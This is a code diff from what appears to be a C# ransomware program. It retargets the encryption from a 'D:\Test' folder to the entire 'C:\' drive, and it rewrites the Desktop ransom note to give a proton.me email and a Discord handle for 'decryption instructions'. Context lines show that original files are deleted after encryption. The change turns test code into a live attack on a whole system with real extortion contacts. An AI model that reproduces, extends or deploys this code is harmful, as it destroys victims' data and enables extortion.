@@ -62,7 +62,7 @@ class Program
     static void Main()
     {
         // Directory path to scan for files
-        string directoryPath = "D:\\Test";
+        string directoryPath = "C:\\";
 
         // File paths
         string keyFilePath = "key.pem";
@@ -97,7 +97,7 @@ class Program
 
             // Create and write to a text file with a custom message on the Desktop
             string messageFilePath = Path.Combine(desktopPath, "readme_.txt");
-            File.WriteAllText(messageFilePath, "Your files have been encrypted. Please contact us for decryption instructions.");
+            File.WriteAllText(messageFilePath, "Your files have been encrypted. By Anonymous you can contact us for the Decryption Instructions Cyberhate@proton.me, or Cryogenproxy on discord");
 
             Console.WriteLine($"Encryption completed. Original file deleted. Encrypted data saved to {outputFile}. Readme file created on the Desktop at {messageFilePath}");
         }
